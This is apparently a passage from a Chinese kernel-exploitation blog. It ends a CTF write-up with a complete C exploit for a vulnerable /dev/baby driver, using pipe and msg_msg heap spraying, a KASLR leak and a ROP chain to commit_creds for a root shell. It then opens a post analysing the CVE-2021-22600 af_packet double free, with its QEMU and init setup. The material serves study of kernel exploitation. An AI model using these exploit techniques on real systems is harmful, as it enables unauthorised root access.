class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x100-0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x40-0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE    0x31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE  0x32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">argg</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> key2;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">size_t</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key2)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.key2 = key2&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x1001</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.key2 = index&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x1003</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> key2,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.key2 = key2, .data = data&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x1002</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> key2, <span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.key = key, .key2 = key2, .data = data&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x2333</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">0x400</span>];</span><br><span class="line">    <span class="keyword">int</span> key_id;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM*<span class="number">10</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">uint64_t</span> pipe_page_addr,pipe_ops_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr,msg_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *rop_chain;</span><br><span class="line">    <span class="keyword">int</span> rop_idx;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">        err_exit(<span class="string">&quot;open /dev/baby&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spary pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span><span class="number">-0x40</span>); <span class="comment">// 0</span></span><br><span class="line">    add(<span class="number">0x400</span><span class="number">-0x30</span>); <span class="comment">// 1</span></span><br><span class="line">    add(<span class="number">0x400</span><span class="number">-0x20</span>); <span class="comment">// 3</span></span><br><span class="line">    add(<span class="number">0x400</span><span class="number">-0x10</span>); <span class="comment">// 7</span></span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line">    add(<span class="number">0x400</span><span class="number">-0x00</span>); <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0x32</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    key_id = key_alloc(<span class="string">&quot;11111111&quot;</span>, data, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (key_id &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;key_alloc error&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">            <span class="comment">/* 1 * pipe_buffer = 0x30 kmalloc-64 */</span> </span><br><span class="line">            err_exit(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;data[<span class="number">0x0</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改chunk-&gt;key */</span></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;data[<span class="number">0x10</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改user_key_payload-&gt;datalen */</span></span><br><span class="line">    edit(<span class="number">0x400</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = key_read(key_id, data, <span class="number">0x400</span>);</span><br><span class="line">    print_hex(data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(data)/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] &gt;= <span class="number">0x1800000000</span> &amp;&amp; *(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] &lt;= <span class="number">0x3800000000</span>)&#123;</span><br><span class="line">            index = i*<span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(index == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;scan&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe_page_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index<span class="number">-8</span>];</span><br><span class="line">    pipe_ops_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index+<span class="number">8</span>]; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pipe_page_addr: 0x%lx\n&quot;</span>,pipe_page_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pipe_ops_addr: 0x%lx\n&quot;</span>,pipe_ops_addr);</span><br><span class="line"></span><br><span class="line">    kernel_offset = pipe_ops_addr - <span class="number">0xffffffff81a0ec80</span>;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>,kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;primary_msg.mtext[<span class="number">8</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff8102ae6d</span>; <span class="comment">// pop_rdi_ret</span></span><br><span class="line">    <span class="comment">/* 对比分析look_up_user_keyrings来计算偏移 */</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xFFFFFFFF81C33060</span>; <span class="comment">// INIT_CRED </span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xFFFFFFFF8106E4F0</span>; <span class="comment">// COMMIT_CREDS</span></span><br><span class="line">    <span class="comment">/* search -t qword 0x5c415d415e415f41 */</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff81600df0</span>+<span class="number">22</span>; <span class="comment">// SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;</span></span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = get_root_shell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    &lt;pt&gt;            0xffffffff8109aaa9 push   rsi</span></span><br><span class="line"><span class="comment">    &lt;pt&gt;            0xffffffff8109d984 push   rsi</span></span><br><span class="line"><span class="comment">    &lt;pt&gt;            0xffffffff81155279 push   rsi</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = <span class="number">0xffffffff81155279</span> + kernel_offset; <span class="comment">// PUSH_RSI_POP_RSP_POP_4VAL_RET</span></span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = pipe_ops_addr;</span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i &lt; PIPE_NUM)&#123;</span><br><span class="line">            close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">            close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;data[<span class="number">0x0</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改chunk-&gt;key */</span></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;data[<span class="number">0x10</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改user_key_payload-&gt;datalen */</span></span><br><span class="line">    edit(<span class="number">0x400</span>,data);</span><br><span class="line"></span><br><span class="line">    res = key_read(key_id, data, <span class="number">0x400</span>);</span><br><span class="line">    print_hex(data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(data)/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] == pipe_ops_addr)&#123;</span><br><span class="line">            index = i*<span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(index == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;scan&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index<span class="number">-8</span>*<span class="number">5</span>];</span><br><span class="line">    victim_addr = msg_addr + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;msg_addr: 0x%lx\n&quot;</span>,msg_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim_addr: 0x%lx\n&quot;</span>,victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (read_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(i == MSG_QUEUE_NUM/<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;free key&quot;</span>);</span><br><span class="line">            key_revoke(key_id);</span><br><span class="line">            dele(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;try to get UAF&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM*<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spary pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM*<span class="number">10</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">            <span class="comment">/* 1 * pipe_buffer = 0x30 kmalloc-64 */</span> </span><br><span class="line">            err_exit(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM*<span class="number">10</span>; i++)&#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;CCCCCCCC&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;CCCCCCCC&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;data[<span class="number">0</span>] = pipe_page_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;data[<span class="number">0x8</span>] = <span class="number">0x2400000000</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;data[<span class="number">0x10</span>] = victim_addr<span class="number">-8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;data[<span class="number">0x18</span>] = kernel_offset + <span class="number">0xffffffff8102ccb5</span>; <span class="comment">// pop_rsp_ret</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;data[<span class="number">0x20</span>] = victim_addr+<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0xffff</span>; i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">        edit(i,data);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target_addr: 0x%lx\n&quot;</span>,<span class="number">0xffffffff81155279</span> + kernel_offset);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM*<span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：kernelpwn.h 在之前的博客中展示过</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/" class="post-title-link" itemprop="url">msg_msg-sk_buff+pipe_buffer attack+CVE-2021-22600</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-01 01:47:24 / Modified: 12:48:06" itemprop="dateCreated datePublished" datetime="2023-12-01T01:47:24+08:00">2023-12-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>52k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>48 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>CVE-2021-22600</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">5.11</span><span class="number">.16</span> (arttnba3@ubuntu) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">20.04</span><span class="number">.1</span>) <span class="number">9.4</span><span class="number">.0</span>, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.34</span>) #<span class="number">1</span> SMP Sat Jun <span class="number">3</span> <span class="number">16</span>:<span class="number">53</span>:<span class="number">03</span> PDT <span class="number">2023</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel &quot;./bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 qiet loglevel=3 oops=panic panic=-1 pti=on kaslr&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -smp cores=1 -s</span><br></pre></td></tr></table></figure>
<ul>
<li>smap，smep，pti，kaslr</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown root /root/flag</span><br><span class="line">chgrp root /root/flag</span><br><span class="line">chmod 400 /root/flag</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<p>内核源码下载：<a target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v5.x/">Index of /pub/linux/kernel/v5.x/</a> </p>
<p><strong>漏洞分析</strong></p>
<p>本题目的漏洞是 CVE-2021-22600，该漏洞影响版本为：Linux Kernel v5.8.0 - v5.15.0</p>
<p>漏洞位于 <code>/net/packet/af_packet.c</code> 文件，rx_owner_map 引用了 pg_vec，切换到 TPACKET_V3 协议版本中，在 <code>packet_set_ring()</code> 函数的末尾，对 pg_vec 释放了一次，并未对 rx_owner_map 指针置为 NULL</p>
<p>直到从 TPACKET_V3 协议版本切换到 TPACKET_V2 协议版本后，在次到达 <code>packet_set_ring()</code> 函数的末尾，<code>bitmap_free()</code> 函数对 rx_owner_map 指针进行释放，触发 double free 漏洞</p>
<p>核心函数 <code>packet_set_ring</code> 源码如下：</p>
